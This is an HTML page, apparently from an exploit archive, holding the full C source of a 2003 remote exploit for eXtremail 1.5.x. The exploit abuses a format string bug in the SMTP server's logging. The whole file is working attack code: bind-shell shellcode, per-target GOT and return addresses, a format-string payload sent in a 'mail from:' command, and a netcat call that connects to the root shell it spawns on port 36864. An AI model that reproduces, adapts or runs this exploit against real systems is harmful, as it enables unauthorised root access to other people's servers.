<html><head><title>Linux eXtremail 1.5.x Remote Format Strings Exploit
</title></head><pre>/****************************************************************/
/* 	    Linux eXtremail 1.5.x Remote Format Strings Exploit	                */
/*                                                           		                                */
/*							*/
/*      	                       By B-r00t - 02/07/2003			*/
/*							*/
/*	Versions:       Linux eXtremail-1.5-8 =&gt; VULNERABLE		*/
/*		    Linux eXtremail-1.5-5 =&gt; VULNERABLE		*/
/*	Exploit uses format strings bug in fLog() of smtpd to bind a 	*/
/*	r00tshell to port 36864 on the target eXtremail server.		*/
/*							*/
/****************************************************************/

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;

#define EXPLOIT &quot;eXtreme&quot;
#define DEST_PORT 25

// Prototypes
int get_sock (char *host);
int send_sock (char *stuff);
int read_sock (void);
void usage (void);
int do_it (void);

// Globals
int socketfd, choice;
unsigned long GOT, RET;
char *myip;
char helo[] = &quot;HELO Br00t~R0x~Y3r~W0rld!\n&quot;;
char shellcode[] = 
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\xeb\x6e\x5e\x29\xc0\x89\x46\x10&quot;
&quot;\x40\x89\xc3\x89\x46\x0c\x40\x89&quot;
&quot;\x46\x08\x8d\x4e\x08\xb0\x66\xcd&quot;
&quot;\x80\x43\xc6\x46\x10\x10\x88\x46&quot;
&quot;\x08\x31\xc0\x31\xd2\x89\x46\x18&quot;
&quot;\xb0\x90\x66\x89\x46\x16\x8d\x4e&quot;
&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;
&quot;\x66\xcd\x80\x89\x5e\x0c\x43\x43&quot;
&quot;\xb0\x66\xcd\x80\x89\x56\x0c\x89&quot;
&quot;\x56\x10\xb0\x66\x43\xcd\x80\x86&quot;
&quot;\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0&quot;
&quot;\x3f\x41\xcd\x80\xb0\x3f\x41\xcd&quot;
&quot;\x80\x88\x56\x07\x89\x76\x0c\x87&quot;
&quot;\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80&quot;
&quot;\xe8\x8d\xff\xff\xff\x2f\x62\x69&quot;
&quot;\x6e\x2f\x73\x68&quot;;


struct {
        char *systemtype;
        unsigned long got;
        unsigned long ret;
        int pad;
        int buf;
        int pos;
} targets[] = {
	// Confirmed targets tested by B-r00t.
        { &quot;RedHat 7.2 eXtremail V1.5 release 5 
(eXtremail-1.5-5.i686.rpm)&quot;,   0x0813b19c, 0xbefff1e8, 1, 266, 44},
        { &quot;Linux ANY eXtremail V1.5 release 5 
(eXtremail-1.5-5.tar.gz)&quot;,   0x0813b19c, 0xbefff1b8, 1, 266, 44},
	{ &quot;Linux ANY eXtremail V1.5 release 7 (ALL VERSIONS)&quot;,   0xbefff0c8, 
0xbefff1d4, 1, 266, 44},
        { &quot;eXtremail V1.5 DEBUG&quot;,   0x44434241, 0xaaaaaaaa, 1, 266, 
44},
        { 0 } 
	};

int main ( int argc, char *argv[] )
{
char *TARGET = &quot;TARGET&quot;;

printf (&quot;\n%s by B-r00t &lt;br00t@blueyonder.co.uk&gt;. (c) 2003\n&quot;, 
EXPLOIT);

if (argc &lt; 3) 
usage ();

choice = atoi(argv[2]);
if (choice &lt; 0 || choice &gt; 3) 
usage ();

setenv (TARGET, argv[1], 1);

get_sock(argv[1]);
sleep (1);
read_sock ();
sleep (1);
send_sock (helo);
sleep (1);
read_sock ();
sleep(1);
do_it ();
}


void usage (void)
{
        int loop;
	printf (&quot;\nUsage: %s [IP_ADDRESS] [TARGET]&quot;, EXPLOIT);
        printf (&quot;\nExample: %s 10.0.0.1 2 \n&quot;, EXPLOIT);
	for (loop = 0; targets[loop].systemtype; loop++)
			printf (&quot;\n%d\t%s&quot;, loop, targets[loop].systemtype);
        printf (&quot;\n\nOn success a r00tshell will be spawned on port 
36864.\n\n&quot;);
	exit (-1);
        }


int get_sock (char *host) 
{
struct sockaddr_in dest_addr;

if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        perror(&quot;Socket Error!\n&quot;);
        exit (-1);
        }

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(DEST_PORT);
if (! inet_aton(host, &amp;(dest_addr.sin_addr))) {
        perror(&quot;inet_aton problems\n&quot;);
        exit (-2);
        }

memset( &amp;(dest_addr.sin_zero), '\0', 8);
if (connect (socketfd, (struct sockaddr *)&amp;dest_addr, sizeof (struct 
sockaddr)) == -1){
        perror(&quot;Connect failed!\n&quot;);
        close (socketfd);
        exit (-3);
        }
printf (&quot;\n\nConnected to %s\n&quot;, host);
}



int send_sock (char *stuff) 
{
	int bytes;
        bytes = (send (socketfd, stuff, strlen(stuff), 0));
        if (bytes == -1) {
        perror(&quot;Send error&quot;);
        close (socketfd);
        exit(4);
	}
printf (&quot;Send:\t%s&quot;, stuff);
return bytes;
}


int read_sock (void) 
{
        int bytes;
	char buffer[200];
	char *ptr;
	ptr = buffer;
	memset (buffer, '\0', sizeof(buffer));
        bytes = (recv (socketfd, ptr, sizeof(buffer), 0));
        if (bytes == -1) {
        perror(&quot;send error&quot;);
        close (socketfd);
        exit(4);
	}
printf (&quot;Recv:\t%s&quot;, buffer);
return bytes;
}


int do_it (void)
{
char format[200], buf[500], *bufptr, *p;
int loop, sofar = 0;
int PAD = targets[choice].pad;
int POS = targets[choice].pos;
unsigned char r[3], g[3], w[3];

RET = targets[choice].ret;
r[0] = (int) (RET &amp; 0x000000ff);
r[1] = (int)((RET &amp; 0x0000ff00) &gt;&gt; 8);
r[2] = (int)((RET &amp; 0x00ff0000) &gt;&gt; 16);
r[3] = (int)((RET &amp; 0xff000000) &gt;&gt; 24);

GOT = targets[choice].got;
g[0] = (int) (GOT &amp; 0x000000ff);
g[1] = (int)((GOT &amp; 0x0000ff00) &gt;&gt; 8);
g[2] = (int)((GOT &amp; 0x00ff0000) &gt;&gt; 16);
g[3] = (int)((GOT &amp; 0xff000000) &gt;&gt; 24);


// Start buf
bufptr = buf;
bzero (bufptr, sizeof(buf));
strncpy (buf, &quot;mail from: &quot;, strlen(&quot;mail from: &quot;));
sofar = 19;

// Do padding
for (loop=0; loop&lt;PAD; loop++)
strncat (buf, &quot;a&quot;, 1);
sofar = sofar+PAD;

//1st GOT addy
strncat (buf, g, 4);

//2nd GOT addy
p = &amp;g[0];
(*p)++;
strncat (buf, g, 4);

// 3rd GOT addy
p = &amp;g[0];
(*p)++;
strncat (buf, g, 4);

// 4th GOT addy
p = &amp;g[0];
(*p)++;
strncat (buf, g, 4);
sofar = sofar+16;

for (loop=0; loop&lt;4; loop++) {
			if (r[loop] &gt; sofar) {
						w[loop] = r[loop]-sofar;
						} else
			if (r[loop] == sofar) {
						w[loop] = 0;
						}else
			if (r[loop] &lt; sofar) {
						w[loop] = (256-sofar)+r[loop];
						}
			sofar = sofar+w[loop];
			}

bufptr = format;
bzero (bufptr, sizeof(format));
sprintf (bufptr, &quot;%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n&quot;, 
w[0], POS, w[1], POS+1, w[2], POS+2, w[3], POS+3);
strncat (buf, format, sizeof(format));
strncat (buf, shellcode, sizeof(shellcode));

// Summarise
printf (&quot;\nSystem type:\t\t%s&quot;, targets[choice].systemtype);
printf (&quot;\nWrite Addy:\t\t0x%x&quot;, GOT);
printf (&quot;\nRET (shellcode):\t0x%x&quot;, RET);
printf (&quot;\nPAD (alignment):\t%d&quot;, PAD);
printf (&quot;\nPayload:\t\t%d / %d max bytes&quot;, strlen(buf), 
targets[choice].buf);
printf (&quot;\nSending it ... \n&quot;);
sleep(1);

// Ok lets Wack it!
send_sock (buf);
sleep (1);
close (socketfd);
printf (&quot;\nUsing netcat 'nc' to get the r00tshell on port 36864 
....!!!!!\n\n\n&quot;);
sleep(3); // May take time to spawn a shell
system(&quot;nc -vv ${TARGET} 36864 || echo 'Sorry Exploit failed!'&quot;);
exit (0);
}

// milw0rm.com [2003-07-02]</pre></html>